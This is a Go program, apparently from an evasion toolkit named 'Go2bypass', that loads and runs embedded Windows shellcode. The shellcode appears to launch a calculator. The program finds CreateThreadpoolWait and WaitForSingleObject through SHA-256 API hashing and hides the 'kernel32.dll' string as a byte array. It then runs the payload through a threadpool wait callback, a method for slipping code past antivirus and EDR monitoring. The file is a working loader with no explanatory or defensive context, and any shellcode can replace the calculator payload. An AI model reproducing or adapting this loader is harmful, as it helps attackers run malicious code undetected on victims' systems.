package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	Go2public "Go2bypass/Public"
	"golang.org/x/sys/windows"
	"syscall"
)

func main() {
	sc := []byte{
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	baseA := Go2public.AllocProtect(sc)
	//CreateThreadPoolWait-b9965c1becf73a78756827d6177e4884fbad979451957fba174694f846133709
	Ctpw, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "b9965c1becf73a78756827d6177e4884fbad979451957fba174694f846133709", Go2public.Sha256Hex)
	//CreateThreadPoolWait := kernel32.NewProc("CreateThreadpoolWait")

	STPDW := kernel32.NewProc("SetThreadpoolWait")
	//WaitForSingleObject-6a98c5468e3cd5c8fec2ed81dcfb6c653bfe56289debe0e1089c92dc8eff744f
	WFSLO, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "6a98c5468e3cd5c8fec2ed81dcfb6c653bfe56289debe0e1089c92dc8eff744f", Go2public.Sha256Hex)
	//WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	event, err := windows.CreateEvent(nil, 0, 1, nil)
	if err != nil {
		return
	}
	//addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	//memcpy(addr, sc)
	//oldProtect := windows.PAGE_READWRITE
	//VirtualProtect.Call(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	pool, _, _ := syscall.Syscall(uintptr(Ctpw), 1, baseA, 0, 0)
	//pool, _, _ := CreateThreadPoolWait.Call(addr, 0, 0)
	STPDW.Call(pool, uintptr(event), 0)
	syscall.Syscall(uintptr(WFSLO), 2, uintptr(event), 0xFFFFFFFF, 0)
}
